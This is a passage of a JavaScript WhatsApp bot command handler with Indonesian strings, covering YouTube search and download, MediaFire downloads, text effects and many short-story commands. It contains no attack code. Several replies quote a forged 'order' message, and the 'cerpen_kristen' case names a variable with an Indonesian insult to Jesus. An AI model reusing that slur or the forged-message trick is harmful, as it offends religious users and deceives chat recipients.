remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case prefix+'ytsearch':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (args.length < 1) return reply(`Contoh:\n${command} bukti Virgoun`)
let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const button = {
title: `Hasil Pencarian Dari ${q}`,
description: "Silahkan Tap Tombol Dibawah",
footerText: `Created By Fαυȥყ`,
buttonText: 'Tap Disini',
listType: 'SINGLE_SELECT',
sections: [
{
title: "Hasil Pencarian", 
rows: list_rows
}
]
}
const templateList = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "listMessage": button }), {});
kirbotz.relayMessage(m.chat, templateList.message, { messageId: templateList.key.id });
break
case prefix+'playmp3': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!text) throw 'Masukan Judul Nya!!!'
let anu = await playmp3(text)
kirbotz.sendImage(m.chat, anu.thumb, `✇ Title : ${anu.title}
✇ Channel : ${anu.channel}
✇ Upload : ${anu.published}
✇ Views : ${anu.views}`, m)
kirbotz.sendMessage(m.chat, { audio: { url: anu.url }, mimetype: 'audio/mp4', ptt:true, contextInfo:{externalAdReply:{
showAdAttribution: true,
title: `Hai Kak ${pushname}`,
body: `© 2022`,
thumbnail: ppnyauser,
mediaType:2,
mediaUrl: 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
sourceUrl: 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}}, { quoted: m })
}
break
case prefix+'playmp4': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!text) throw 'Masukan Judul Nya!!!'
let anu = await playmp4(text)
let message = await prepareWAMessageMedia({ video : { url: anu.url } }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
videoMessage: message.videoMessage,
hydratedContentText: `Title : ${anu.title}
Channel : ${anu.channel}
Upload : ${anu.published}
Views : ${anu.views}
Link Download : 
${anu.url}`,
hydratedFooterText: 'Jangan Lupa Subscribe YT : FαυȥყRêålz',
hydratedButtons: []
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case prefix+'play':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!text) return reply(`Example : ${command} story wa anime`)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '6287705048235'
ngen = `
🕵️ Title : ${anu.title}
🥀 Ext : Search
🍁 ID : ${anu.videoId}
👀 Viewers : ${anu.views}
💌 Upload At : ${anu.ago}
🗣️ Author : ${anu.author.name}
🧑‍ Channel : ${anu.author.url}`
let buttonse = [
{buttonId: `✇ ytmp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `✇ ytmp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'kir': case 'slebew': case 'bot': case 'tes':{
kirbotz.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: lep })
}
break
case prefix+'ythd':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Link Nya Kak???`)
let res = await ythd(q)
kirbotz.sendMessage(from, { document: { url: res.dl_link }, fileName: `${res.title}.mp4`, mimetype: `application/zip`}, { quoted: m })
}
break
case prefix+'emoji':{
if (!q) return reply(`Contoh ${command} 😀`)
let res = await emoji(q)
reply(util.format(res))
}
break
case prefix+'ytmp4': 
case prefix+'ytvideo': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let { ytv } = require('./y2mate')
if (!text) throw `Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
kirbotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP4\n✇ Resolusi : ${args[1] || '360p'}`, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}}, { quoted: m })
}
break
case prefix+'ytmp3': 
case prefix+'ytaudio': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let { yta } = require('./y2mate')
if (!text) throw `Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
kirbotz.sendImage(m.chat, media.thumb, `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '128kbps'}`, m)
kirbotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}}, { quoted: m })
}
break
case prefix+'mediafire':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!text) return reply(`Link Nya Kak???`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Contoh ${prefix+command} https://www.mediafire.com/file/uoo686zvjoouwpr/SC_GRUB_OKEP_%255BNO_CURL_S2M%255D.zip/file`)
const djej = "6287705048235@s.whatsapp.net"
const zk = await mediafire(`${text}`)
const mbc = `Nih Kak @${sender.split("@")[0]}\nDownload File Di Atas Yah\n\nUrl : ${zk.url}\nUrl² : ${zk.url2}\nFilename : ${zk.filename}\nFiletype : ${zk.filetype}\nExt : ${zk.ext}\nUpload : ${zk.aploud}\nFilesizeH : ${zk.filesizeH}\nFilesize : ${zk.filesize}`
let buuttoons = [
{buttonId: `ngn`, buttonText: {displayText: 'Makasih'}, type: 1}
]
let bguttonMessaage = {
document: { url: zk.url }, 
fileName: `${zk.filename}`, 
mimetype: `application/zip`,
jpegThumbnail: ppnyauser,
caption: mbc,
mentions:[sender, djej],
footer: `_Powered By @${djej.split("@")[0]}_`,
buttons: buuttoons,
headerType: 4,
contextInfo: { "mentionedJid": [sender, djej]
}}
kirbotz.sendMessage(m.chat, bguttonMessaage)
}
break
case prefix+'attp':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh: ${command} Hai`)
let res = await attp.attp(q)
let gehdhe = await getBuffer(`${res.result}`)
let encmedia = await kirbotz.sendVideoAsSticker(m.chat, gehdhe, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
break
case prefix+'cerpen_anak':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpe = await cerpen.cerpen(`anak`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case prefix+'cerpen_bahasadaerah':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpet = await cerpen.cerpen(`bahasa daerah`)
reply(`⭔ _*Title :*_ ${cerpet.title}\n⭔ _*Author :*_ ${cerpet.author}\n⭔ _*Category :*_ ${cerpet.kategori}\n⭔ _*Pass Moderation :*_ ${cerpet.lolos}\n⭔ _*Story :*_\n${cerpet.cerita}`)
}
break
case prefix+'cerpen_bahasainggris':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpez = await cerpen.cerpen(`bahasa Inggris`)
reply(`⭔ _*Title :*_ ${cerpez.title}\n⭔ _*Author :*_ ${cerpez.author}\n⭔ _*Category :*_ ${cerpez.kategori}\n⭔ _*Pass Moderation :*_ ${cerpez.lolos}\n⭔ _*Story :*_\n${cerpez.cerita}`)
}
break
case prefix+'cerpen_bahasajawa':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpep = await cerpen.cerpen(`bahasa jawa`)
reply(`⭔ _*Title :*_ ${cerpep.title}\n⭔ _*Author :*_ ${cerpep.author}\n⭔ _*Category :*_ ${cerpep.kategori}\n⭔ _*Pass Moderation :*_ ${cerpep.lolos}\n⭔ _*Story :*_\n${cerpep.cerita}`)
}
break
case prefix+'cerpen_bahasasunda':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerped = await cerpen.cerpen(`bahasa sunda`)
reply(`⭔ _*Title :*_ ${cerped.title}\n⭔ _*Author :*_ ${cerped.author}\n⭔ _*Category :*_ ${cerped.kategori}\n⭔ _*Pass Moderation :*_ ${cerped.lolos}\n⭔ _*Story :*_\n${cerped.cerita}`)
}
break
case prefix+'cerpen_budaya':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerper = await cerpen.cerpen(`budaya`)
reply(`⭔ _*Title :*_ ${cerper.title}\n⭔ _*Author :*_ ${cerper.author}\n⭔ _*Category :*_ ${cerper.kategori}\n⭔ _*Pass Moderation :*_ ${cerper.lolos}\n⭔ _*Story :*_\n${cerper.cerita}`)
}
break
case prefix+'cerpen_cinta':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpem = await cerpen.cerpen(`cinta`)
reply(`⭔ _*Title :*_ ${cerpem.title}\n⭔ _*Author :*_ ${cerpem.author}\n⭔ _*Category :*_ ${cerpem.kategori}\n⭔ _*Pass Moderation :*_ ${cerpem.lolos}\n⭔ _*Story :*_\n${cerpem.cerita}`)
}
break
case prefix+'cerpen_cintaislami':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpel = await cerpen.cerpen(`cinta islami`)
reply(`⭔ _*Title :*_ ${cerpel.title}\n⭔ _*Author :*_ ${cerpel.author}\n⭔ _*Category :*_ ${cerpel.kategori}\n⭔ _*Pass Moderation :*_ ${cerpel.lolos}\n⭔ _*Story :*_\n${cerpel.cerita}`)
}
break
case prefix+'cerpen_cintapertama':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpes = await cerpen.cerpen(`cinta pertama`)
reply(`⭔ _*Title :*_ ${cerpes.title}\n⭔ _*Author :*_ ${cerpes.author}\n⭔ _*Category :*_ ${cerpes.kategori}\n⭔ _*Pass Moderation :*_ ${cerpes.lolos}\n⭔ _*Story :*_\n${cerpes.cerita}`)
}
break
case prefix+'cerpen_cintaromantis':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cerpde = await cerpen.cerpen(`cinta romantis`)
reply(`⭔ _*Title :*_ ${cerpde.title}\n⭔ _*Author :*_ ${cerpde.author}\n⭔ _*Category :*_ ${cerpde.kategori}\n⭔ _*Pass Moderation :*_ ${cerpde.lolos}\n⭔ _*Story :*_\n${cerpde.cerita}`)
}
break
case prefix+'cerpen_cintasedih':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let fejdj = await cerpen.cerpen(`cinta sedih`)
reply(`⭔ _*Title :*_ ${fejdj.title}\n⭔ _*Author :*_ ${fejdj.author}\n⭔ _*Category :*_ ${fejdj.kategori}\n⭔ _*Pass Moderation :*_ ${fejdj.lolos}\n⭔ _*Story :*_\n${fejdj.cerita}`)
}
break
case prefix+'cerpen_cintasegitiga':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let frofk = await cerpen.cerpen(`Cinta segitiga`)
reply(`⭔ _*Title :*_ ${frofk.title}\n⭔ _*Author :*_ ${frofk.author}\n⭔ _*Category :*_ ${frofk.kategori}\n⭔ _*Pass Moderation :*_ ${frofk.lolos}\n⭔ _*Story :*_\n${frofk.cerita}`)
}
break
case prefix+'cerpen_cintasejati':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let frljkek = await cerpen.cerpen(`cinta sejati`)
reply(`⭔ _*Title :*_ ${frljkek.title}\n⭔ _*Author :*_ ${frljkek.author}\n⭔ _*Category :*_ ${frljkek.kategori}\n⭔ _*Pass Moderation :*_ ${frljkek.lolos}\n⭔ _*Story :*_\n${frljkek.cerita}`)
}
break
case prefix+'cerpen_galau':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cdjfj = await cerpen.cerpen(`galau`)
reply(`⭔ _*Title :*_ ${cdjfj.title}\n⭔ _*Author :*_ ${cdjfj.author}\n⭔ _*Category :*_ ${cdjfj.kategori}\n⭔ _*Pass Moderation :*_ ${cdjfj.lolos}\n⭔ _*Story :*_\n${cdjfj.cerita}`)
}
break
case prefix+'cerpen_gokil':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vrkfjf = await cerpen.cerpen(`gokil`)
reply(`⭔ _*Title :*_ ${vrkfjf.title}\n⭔ _*Author :*_ ${vrkfjf.author}\n⭔ _*Category :*_ ${vrkfjf.kategori}\n⭔ _*Pass Moderation :*_ ${vrkfjf.lolos}\n⭔ _*Story :*_\n${vrkfjf.cerita}`)
}
break
case prefix+'cerpen_inspiratif':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let ngkgk = await cerpen.cerpen(`inspiratif`)
reply(`⭔ _*Title :*_ ${ngkgk.title}\n⭔ _*Author :*_ ${ngkgk.author}\n⭔ _*Category :*_ ${ngkgk.kategori}\n⭔ _*Pass Moderation :*_ ${ngkgk.lolos}\n⭔ _*Story :*_\n${ngkgk.cerita}`)
}
break
case prefix+'cerpen_jepang':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vrlgk = await cerpen.cerpen(`jepang`)
reply(`⭔ _*Title :*_ ${vrlgk.title}\n⭔ _*Author :*_ ${vrlgk.author}\n⭔ _*Category :*_ ${vrlgk.kategori}\n⭔ _*Pass Moderation :*_ ${vrlgk.lolos}\n⭔ _*Story :*_\n${vrlgk.cerita}`)
}
break
case prefix+'cerpen_kehidupan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let ntlgkt = await cerpen.cerpen(`kehidupan`)
reply(`⭔ _*Title :*_ ${ntlgkt.title}\n⭔ _*Author :*_ ${ntlgkt.author}\n⭔ _*Category :*_ ${ntlgkt.kategori}\n⭔ _*Pass Moderation :*_ ${ntlgkt.lolos}\n⭔ _*Story :*_\n${ntlgkt.cerita}`)
}
break
case prefix+'cerpen_keluarga':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let bmflg = await cerpen.cerpen(`keluarga`)
reply(`⭔ _*Title :*_ ${bmflg.title}\n⭔ _*Author :*_ ${bmflg.author}\n⭔ _*Category :*_ ${bmflg.kategori}\n⭔ _*Pass Moderation :*_ ${bmflg.lolos}\n⭔ _*Story :*_\n${bmflg.cerita}`)
}
break
case prefix+'cerpen_kisahnyata':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let yptoo = await cerpen.cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${yptoo.title}\n⭔ _*Author :*_ ${yptoo.author}\n⭔ _*Category :*_ ${yptoo.kategori}\n⭔ _*Pass Moderation :*_ ${yptoo.lolos}\n⭔ _*Story :*_\n${yptoo.cerita}`)
}
break
case prefix+'cerpen_korea':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let jptpgr = await cerpen.cerpen(`korea`)
reply(`⭔ _*Title :*_ ${jptpgr.title}\n⭔ _*Author :*_ ${jptpgr.author}\n⭔ _*Category :*_ ${jptpgr.kategori}\n⭔ _*Pass Moderation :*_ ${jptpgr.lolos}\n⭔ _*Story :*_\n${jptpgr.cerita}`)
}
break
case prefix+'cerpen_kristen':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let yesusanjing = await cerpen.cerpen(`kristen`)
reply(`⭔ _*Title :*_ ${yesusanjing.title}\n⭔ _*Author :*_ ${yesusanjing.author}\n⭔ _*Category :*_ ${yesusanjing.kategori}\n⭔ _*Pass Moderation :*_ ${yesusanjing.lolos}\n⭔ _*Story :*_\n${yesusanjing.cerita}`)
}
break
case prefix+'cerpen_liburan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let frkfkrk = await cerpen.cerpen(`liburan`)
reply(`⭔ _*Title :*_ ${frkfkrk.title}\n⭔ _*Author :*_ ${frkfkrk.author}\n⭔ _*Category :*_ ${frkfkrk.kategori}\n⭔ _*Pass Moderation :*_ ${frkfkrk.lolos}\n⭔ _*Story :*_\n${frkfkrk.cerita}`)
}
break
case prefix+'cerpen_malaysia':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let mzbdjd = await cerpen.cerpen(`malaysia`)
reply(`⭔ _*Title :*_ ${mzbdjd.title}\n⭔ _*Author :*_ ${mzbdjd.author}\n⭔ _*Category :*_ ${mzbdjd.kategori}\n⭔ _*Pass Moderation :*_ ${mzbdjd.lolos}\n⭔ _*Story :*_\n${mzbdjd.cerita}`)
}
break
case prefix+'cerpen_mengharukan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let bgfngk = await cerpen.cerpen(`mengharukan`)
reply(`⭔ _*Title :*_ ${bgfngk.title}\n⭔ _*Author :*_ ${bgfngk.author}\n⭔ _*Category :*_ ${bgfngk.kategori}\n⭔ _*Pass Moderation :*_ ${bgfngk.lolos}\n⭔ _*Story :*_\n${bgfngk.cerita}`)
}
break
case prefix+'cerpen_misteri':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let lapdoek = await cerpen.cerpen(`misteri`)
reply(`⭔ _*Title :*_ ${lapdoek.title}\n⭔ _*Author :*_ ${lapdoek.author}\n⭔ _*Category :*_ ${lapdoek.kategori}\n⭔ _*Pass Moderation :*_ ${lapdoek.lolos}\n⭔ _*Story :*_\n${lapdoek.cerita}`)
}
break
case prefix+'cerpen_motivasi':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let bltkyj = await cerpen.cerpen(`motivasi`)
reply(`⭔ _*Title :*_ ${bltkyj.title}\n⭔ _*Author :*_ ${bltkyj.author}\n⭔ _*Category :*_ ${bltkyj.kategori}\n⭔ _*Pass Moderation :*_ ${bltkyj.lolos}\n⭔ _*Story :*_\n${bltkyj.cerita}`)
}
break
case prefix+'cerpen_nasihat':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let qpeidek = await cerpen.cerpen(`nasihat`)
reply(`⭔ _*Title :*_ ${qpeidek.title}\n⭔ _*Author :*_ ${qpeidek.author}\n⭔ _*Category :*_ ${qpeidek.kategori}\n⭔ _*Pass Moderation :*_ ${qpeidek.lolos}\n⭔ _*Story :*_\n${qpeidek.cerita}`)
}
break
case prefix+'cerpen_nasionalisme':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let cdmrgo = await cerpen.cerpen(`nasionalisme`)
reply(`⭔ _*Title :*_ ${cdmrgo.title}\n⭔ _*Author :*_ ${cdmrgo.author}\n⭔ _*Category :*_ ${cdmrgo.kategori}\n⭔ _*Pass Moderation :*_ ${cdmrgo.lolos}\n⭔ _*Story :*_\n${cdmrgo.cerita}`)
}
break
case prefix+'cerpen_olahraga':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let qpdiek = await cerpen.cerpen(`olahraga`)
reply(`⭔ _*Title :*_ ${qpdiek.title}\n⭔ _*Author :*_ ${qpdiek.author}\n⭔ _*Category :*_ ${qpdiek.kategori}\n⭔ _*Pass Moderation :*_ ${qpdiek.lolos}\n⭔ _*Story :*_\n${qpdiek.cerita}`)
}
break
case prefix+'cerpen_patahhati':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vrlfor = await cerpen.cerpen(`patah hati`)
reply(`⭔ _*Title :*_ ${vrlfor.title}\n⭔ _*Author :*_ ${vrlfor.author}\n⭔ _*Category :*_ ${vrlfor.kategori}\n⭔ _*Pass Moderation :*_ ${vrlfor.lolos}\n⭔ _*Story :*_\n${vrlfor.cerita}`)
}
break
case prefix+'cerpen_penantian':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let aldpek = await cerpen.cerpen(`penantian`)
reply(`⭔ _*Title :*_ ${aldpek.title}\n⭔ _*Author :*_ ${aldpek.author}\n⭔ _*Category :*_ ${aldpek.kategori}\n⭔ _*Pass Moderation :*_ ${aldpek.lolos}\n⭔ _*Story :*_\n${aldpek.cerita}`)
}
break
case prefix+'cerpen_pendidikan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let xnrjrk = await cerpen.cerpen(`pendidikan`)
reply(`⭔ _*Title :*_ ${xnrjrk.title}\n⭔ _*Author :*_ ${xnrjrk.author}\n⭔ _*Category :*_ ${xnrjrk.kategori}\n⭔ _*Pass Moderation :*_ ${xnrjrk.lolos}\n⭔ _*Story :*_\n${xnrjrk.cerita}`)
}
break
case prefix+'cerpen_pengalaman':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let hrkgor = await cerpen.cerpen(`pengalaman pribadi`)
reply(`⭔ _*Title :*_ ${hrkgor.title}\n⭔ _*Author :*_ ${hrkgor.author}\n⭔ _*Category :*_ ${hrkgor.kategori}\n⭔ _*Pass Moderation :*_ ${hrkgor.lolos}\n⭔ _*Story :*_\n${hrkgor.cerita}`)
}
break
case prefix+'cerpen_pengorbanan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let itklog = await cerpen.cerpen(`pengorbanan`)
reply(`⭔ _*Title :*_ ${itklog.title}\n⭔ _*Author :*_ ${itklog.author}\n⭔ _*Category :*_ ${itklog.kategori}\n⭔ _*Pass Moderation :*_ ${itklog.lolos}\n⭔ _*Story :*_\n${itklog.cerita}`)
}
break
case prefix+'cerpen_penyesalan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let pgrjgo = await cerpen.cerpen(`penyesalan`)
reply(`⭔ _*Title :*_ ${pgrjgo.title}\n⭔ _*Author :*_ ${pgrjgo.author}\n⭔ _*Category :*_ ${pgrjgo.kategori}\n⭔ _*Pass Moderation :*_ ${pgrjgo.lolos}\n⭔ _*Story :*_\n${pgrjgo.cerita}`)
}
break
case prefix+'cerpen_perjuangan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vtlgotk = await cerpen.cerpen(`perjuangan`)
reply(`⭔ _*Title :*_ ${vtlgotk.title}\n⭔ _*Author :*_ ${vtlgotk.author}\n⭔ _*Category :*_ ${vtlgotk.kategori}\n⭔ _*Pass Moderation :*_ ${vtlgotk.lolos}\n⭔ _*Story :*_\n${vtlgotk.cerita}`)
}
break
case prefix+'cerpen_perpisahan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let wpfuej = await cerpen.cerpen(`perpisahan`)
reply(`⭔ _*Title :*_ ${wpfuej.title}\n⭔ _*Author :*_ ${wpfuej.author}\n⭔ _*Category :*_ ${wpfuej.kategori}\n⭔ _*Pass Moderation :*_ ${wpfuej.lolos}\n⭔ _*Story :*_\n${wpfuej.cerita}`)
}
break
case prefix+'cerpen_persahabatan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let jptoyk = await cerpen.cerpen(`persahabatan`)
reply(`⭔ _*Title :*_ ${jptoyk.title}\n⭔ _*Author :*_ ${jptoyk.author}\n⭔ _*Category :*_ ${jptoyk.kategori}\n⭔ _*Pass Moderation :*_ ${jptoyk.lolos}\n⭔ _*Story :*_\n${jptoyk.cerita}`)
}
break
case prefix+'cerpen_petualangan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let qwers = await cerpen.cerpen(`petualangan`)
reply(`⭔ _*Title :*_ ${qwers.title}\n⭔ _*Author :*_ ${qwers.author}\n⭔ _*Category :*_ ${qwers.kategori}\n⭔ _*Pass Moderation :*_ ${qwers.lolos}\n⭔ _*Story :*_\n${qwers.cerita}`)
}
break
case prefix+'cerpen_ramadhan':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vrmfkk = await cerpen.cerpen(`ramadhan`)
reply(`⭔ _*Title :*_ ${vrmfkk.title}\n⭔ _*Author :*_ ${vrmfkk.author}\n⭔ _*Category :*_ ${vrmfkk.kategori}\n⭔ _*Pass Moderation :*_ ${vrmfkk.lolos}\n⭔ _*Story :*_\n${vrmfkk.cerita}`)
}
break
case prefix+'cerpen_remaja':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let vhptotk = await cerpen.cerpen(`remaja`)
reply(`⭔ _*Title :*_ ${vhptotk.title}\n⭔ _*Author :*_ ${vhptotk.author}\n⭔ _*Category :*_ ${vhptotk.kategori}\n⭔ _*Pass Moderation :*_ ${vhptotk.lolos}\n⭔ _*Story :*_\n${vhptotk.cerita}`)
}
break
case prefix+'cerpen_rindu':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let hptotlltk = await cerpen.cerpen(`rindu`)
reply(`⭔ _*Title :*_ ${hptotlltk.title}\n⭔ _*Author :*_ ${hptotlltk.author}\n⭔ _*Category :*_ ${hptotlltk.kategori}\n⭔ _*Pass Moderation :*_ ${hptotlltk.lolos}\n⭔ _*Story :*_\n${hptotlltk.cerita}`)
}
break
case prefix+'cerpen_rohani':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let zaldjdws = await cerpen.cerpen(`rohani`)
reply(`⭔ _*Title :*_ ${zaldjdws.title}\n⭔ _*Author :*_ ${zaldjdws.author}\n⭔ _*Category :*_ ${zaldjdws.kategori}\n⭔ _*Pass Moderation :*_ ${zaldjdws.lolos}\n⭔ _*Story :*_\n${zaldjdws.cerita}`)
}
break
case prefix+'cerpen_romantis':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let lxprhrh = await cerpen.cerpen(`romantis`)
reply(`⭔ _*Title :*_ ${lxprhrh.title}\n⭔ _*Author :*_ ${lxprhrh.author}\n⭔ _*Category :*_ ${lxprhrh.kategori}\n⭔ _*Pass Moderation :*_ ${lxprhrh.lolos}\n⭔ _*Story :*_\n${lxprhrh.cerita}`)
}
break
case prefix+'cerpen_sastra':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let qpifker = await cerpen.cerpen(`sastra`)
reply(`⭔ _*Title :*_ ${qpifker.title}\n⭔ _*Author :*_ ${qpifker.author}\n⭔ _*Category :*_ ${qpifker.kategori}\n⭔ _*Pass Moderation :*_ ${qpifker.lolos}\n⭔ _*Story :*_\n${qpifker.cerita}`)
}
break
case prefix+'cerpen_sedih':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let bmflgkjt = await cerpen.cerpen(`sedih`)
reply(`⭔ _*Title :*_ ${bmflgkjt.title}\n⭔ _*Author :*_ ${bmflgkjt.author}\n⭔ _*Category :*_ ${bmflgkjt.kategori}\n⭔ _*Pass Moderation :*_ ${bmflgkjt.lolos}\n⭔ _*Story :*_\n${bmflgkjt.cerita}`)
}
break
case prefix+'cerpen_sejarah':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let xwpwifj = await cerpen.cerpen(`sejarah`)
reply(`⭔ _*Title :*_ ${xwpwifj.title}\n⭔ _*Author :*_ ${xwpwifj.author}\n⭔ _*Category :*_ ${xwpwifj.kategori}\n⭔ _*Pass Moderation :*_ ${xwpwifj.lolos}\n⭔ _*Story :*_\n${xwpwifj.cerita}`)
}
break
case prefix+'shadow': 
case prefix+'write': 
case prefix+'romantic': 
case prefix+'burnpaper':
case prefix+'smoke': 
case prefix+'naruto': 
case prefix+'love': 
case prefix+'undergrass':
case prefix+'doublelove': 
case prefix+'coffecup':
case prefix+'underwaterocean':
case prefix+'smokyneon':
case prefix+'starstext':
case prefix+'rainboweffect':
case prefix+'balloontext':
case prefix+'metalliceffect':
case prefix+'embroiderytext':
case prefix+'flamingtext':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Example : ${command} KirBotz`) 
let link
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
